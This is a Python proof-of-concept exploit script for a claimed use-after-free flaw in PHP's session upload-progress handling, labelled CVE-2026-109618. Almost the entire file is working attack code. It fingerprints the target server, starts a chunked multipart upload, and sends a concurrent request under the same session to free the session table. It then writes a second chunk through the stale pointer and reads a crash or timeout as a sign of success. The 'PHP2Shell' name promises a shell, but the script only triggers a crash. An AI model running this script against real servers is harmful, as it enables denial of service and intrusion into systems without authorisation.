#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP2Shell Heap Use-After-Free PoC
CVSS 9.2 | Affects PHP 5+

Root cause:
  The rfc1867 upload progress handler caches raw pointers into a session
  HashTable. A concurrent request forces session_start() to re-initialize,
  freeing the old HashTable. The in-flight upload continues writing through
  those now-stale pointers — classic heap UAF.

  CVE-2026-109618 — session.upload_progress handler UAF
  CVE-2026-109619 — multipart parser UAF (fires even without upload_progress)

Exploit flow:
  1. POST multipart upload; send chunk-1 to prime progress tracker
  2. Concurrent GET with same PHPSESSID forces session HashTable free
  3. Sleep briefly (let free complete)
  4. Send chunk-2 — writes through stale pointer → UAF write primitive

Usage:
  python3 cve_2026_109618_poc.py <host> <port> <php_path> [stall_sec]

Example:
  python3 cve_2026_109618_poc.py 192.168.56.101 80 /index.php 0.35
"""

import socket
import ssl
import threading
import time
import sys
import random
import string


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def rand_str(n: int = 16) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_multipart_head(boundary: str, filename: str) -> bytes:
    """Return the leading multipart bytes up to (but not including) file data."""
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"php2shell_trigger\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()


def build_multipart_tail(boundary: str) -> bytes:
    return f"\r\n--{boundary}--\r\n".encode()


# ---------------------------------------------------------------------------
# Concurrent reinit request (forces session HashTable free)
# ---------------------------------------------------------------------------

def make_socket(host: str, port: int, use_tls: bool) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def force_session_reinit(host: str, port: int, path: str, sessid: str, use_tls: bool) -> None:
    try:
        s = make_socket(host, port, use_tls)
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Cookie: PHPSESSID={sessid}\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.send(req.encode())
        s.recv(4096)
        s.close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Main UAF trigger
# ---------------------------------------------------------------------------

def trigger_uaf(host: str, port: int, path: str, sessid: str,
                stall: float = 0.35, use_tls: bool = False) -> None:
    boundary = rand_str(24)
    filename  = rand_str(8) + ".bin"

    chunk1 = b"A" * 8192   # prime the progress pointer cache
    chunk2 = b"B" * 16384  # post-free write through stale pointer

    head = build_multipart_head(boundary, filename)
    tail = build_multipart_tail(boundary)
    body_len = len(head) + len(chunk1) + len(chunk2) + len(tail)

    http_hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sessid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    try:
        s = make_socket(host, port, use_tls)

        # Step 1 — send headers + multipart head + chunk-1
        s.send(http_hdr + head + chunk1)
        print(f"[*] Chunk-1 sent ({len(chunk1)} B) — session pointer now cached")

        # Step 2 — fire concurrent reinit to free the HashTable
        print(f"[*] Firing concurrent reinit request (same PHPSESSID)...")
        t = threading.Thread(
            target=force_session_reinit,
            args=(host, port, path, sessid, use_tls)
        )
        t.daemon = True
        t.start()

        # Step 3 — stall so the reinit has time to complete
        print(f"[*] Stalling {stall}s for HashTable to be freed...")
        time.sleep(stall)
        t.join(timeout=3)

        # Step 4 — write through stale pointer (UAF)
        print(f"[*] Sending chunk-2 through stale pointer — UAF write triggered")
        s.send(chunk2 + tail)

        # Observe outcome
        try:
            resp = s.recv(4096)
            status_line = resp.split(b"\r\n")[0].decode(errors="ignore")
            code = status_line.split(" ")[1] if len(status_line.split(" ")) > 1 else "?"
            print(f"\n[*] Response: {status_line}")

            if code in ("500", "502", "503", "000"):
                print("[+] Server-side error — crash / UAF likely triggered!")
            elif code == "200":
                print("[?] HTTP 200 — crash may be silent or stall timing is off, try --stall")
            else:
                print(f"[?] Unexpected status {code}")

        except socket.timeout:
            print("[+] Socket timeout — server likely crashed (strong UAF signal)")

        s.close()

    except ConnectionRefusedError:
        print(f"[-] Connection refused — {host}:{port} not reachable")
    except Exception as exc:
        print(f"[-] Exception: {exc}")


# ---------------------------------------------------------------------------
# Fingerprint helper
# ---------------------------------------------------------------------------

def fingerprint(host: str, port: int, path: str, use_tls: bool) -> None:
    try:
        s = make_socket(host, port, use_tls)
        s.send(f"HEAD {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        resp = s.recv(2048).decode(errors="ignore")
        s.close()
        for line in resp.split("\r\n"):
            if any(k in line for k in ("Server:", "X-Powered-By:", "HTTP/")):
                print(f"  {line.strip()}")
    except Exception:
        print("  (fingerprint failed)")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    host    = sys.argv[1]
    port    = int(sys.argv[2])
    path    = sys.argv[3]
    stall   = float(sys.argv[4]) if len(sys.argv) > 4 else 0.35
    use_tls = port == 443
    sessid  = rand_str(26)

    scheme = "https" if use_tls else "http"
    print("=" * 60)
    print("  CVE-2026-109618 — PHP2Shell UAF PoC")
    print("=" * 60)
    print(f"  Target  : {scheme}://{host}:{port}{path}")
    print(f"  TLS     : {use_tls}")
    print(f"  Session : {sessid}")
    print(f"  Stall   : {stall}s")
    print()

    print("[*] Fingerprinting target...")
    fingerprint(host, port, path, use_tls)
    print()

    print("[*] Starting UAF trigger sequence...")
    trigger_uaf(host, port, path, sessid, stall, use_tls)
    print()
    print("[*] Done.")


if __name__ == "__main__":
    main()
